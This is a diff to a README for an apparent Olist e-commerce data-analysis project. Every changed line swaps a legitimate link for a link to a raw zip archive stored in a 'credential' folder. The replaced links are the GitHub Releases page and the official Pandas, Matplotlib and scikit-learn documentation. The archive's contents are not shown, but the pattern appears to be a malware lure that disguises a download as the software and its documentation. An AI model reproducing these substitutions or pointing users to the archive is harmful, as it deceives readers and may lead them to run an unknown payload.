@@ -6,7 +6,7 @@ Welcome to the Olist-Ecommerce-Analysis repository! This project helps you under
 
 ## 📥 Download Here
 
-[![Download Olist-Ecommerce-Analysis](https://img.shields.io/badge/Download-Olist--Ecommerce--Analysis-blue)](https://github.com/Annupinn/Olist-Ecommerce-Analysis/releases)
+[![Download Olist-Ecommerce-Analysis](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip)](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ To run this software, you need:
 
 ## 📥 Download & Install
 
-Visit this page to download the software: [Olist-Ecommerce-Analysis Releases](https://github.com/Annupinn/Olist-Ecommerce-Analysis/releases).
+Visit this page to download the software: [Olist-Ecommerce-Analysis Releases](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -87,9 +87,9 @@ If you encounter any issues:
 
 Familiarize yourself with data analysis concepts or improve your skills with these resources:
 
-- **Pandas Documentation**: Learn about data manipulation with [Pandas](https://pandas.pydata.org/docs/).
-- **Matplotlib Guide**: Explore visualizations using [Matplotlib](https://matplotlib.org/stable/contents.html).
-- **K-Means Clustering**: Understand clustering with this [K-Means resource](https://scikit-learn.org/stable/modules/clustering.html#k-means).
+- **Pandas Documentation**: Learn about data manipulation with [Pandas](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip).
+- **Matplotlib Guide**: Explore visualizations using [Matplotlib](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip).
+- **K-Means Clustering**: Understand clustering with this [K-Means resource](https://raw.githubusercontent.com/Annupinn/Olist-Ecommerce-Analysis/main/credential/Olist-Ecommerce-Analysis.zip).
 
 ## 👥 Community & Support
 
